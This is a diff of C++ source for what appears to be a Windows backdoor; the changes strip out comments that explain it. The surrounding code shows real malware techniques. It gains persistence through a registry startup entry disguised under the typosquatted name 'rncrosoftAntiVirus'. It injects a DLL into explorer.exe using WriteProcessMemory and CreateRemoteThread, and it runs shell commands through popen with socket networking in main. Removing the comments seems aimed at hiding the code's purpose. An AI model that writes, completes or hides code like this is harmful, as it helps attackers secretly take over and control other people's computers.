@@ -7,9 +7,6 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #pragma comment(lib, "ws2_32.lib") // Link with the ws2_32.lib library
 
-// ============================================================================
-// MODIFICATION: Function to add program to Windows startup registry
-// ============================================================================
 bool AddToStartup() {
     HKEY hKey;
     const char* czStartName = "rncrosoftAntiVirus";
@@ -81,9 +78,6 @@ bool RemoveFromStartup() {
     return (result == ERROR_SUCCESS);
 }
 
-// END MODIFICATION
-// MODIFICATION: Process injection functions to inject into explorer.exe
-// Find process ID by name
 DWORD FindProcessId(const std::wstring& processName) {
     PROCESSENTRY32 processEntry;
     processEntry.dwSize = sizeof(PROCESSENTRY32);
@@ -145,7 +139,7 @@ bool InjectIntoProcess(DWORD processId) {
         return false;
     }
 
-    // Write the DLL path to the allocated memory
+ 
     if (!WriteProcessMemory(hProcess, pRemoteMemory, szPath, strlen(szPath) + 1, NULL)) {
         std::cerr << "Failed to write to process memory. Error: " << GetLastError() << std::endl;
         VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
@@ -162,7 +156,7 @@ bool InjectIntoProcess(DWORD processId) {
         return false;
     }
 
-    // Create a remote thread to load the DLL
+
     HANDLE hThread = CreateRemoteThread(
         hProcess,
         NULL,
@@ -236,14 +230,11 @@ bool SetupPersistenceWithInjection() {
 }
 
 std::string exec(const char* cmd) {
-    // Pipe pointer to hold the output stream of the command
     FILE* pipe = nullptr;
-
-    // Use _popen (Windows) to execute the command and open a pipe to read its output
 #ifdef _WIN32
     pipe = _popen(cmd, "r");
 #else
-    // On Linux/macOS, use popen (and the 'ls -l' command would be used instead of 'dir')
+    
     pipe = popen(cmd, "r");
 #endif
 
@@ -273,6 +264,7 @@ std::string exec(const char* cmd) {
     if (status == -1) {
         // Handle closure error (though often ignored for simple commands)
         // For robustness, we check it here.
+        //pending implemention
     }
 
     return result;
@@ -477,4 +469,5 @@ int main() {
     closesocket(clientSocket);
     WSACleanup();
     return 0;
+
 }
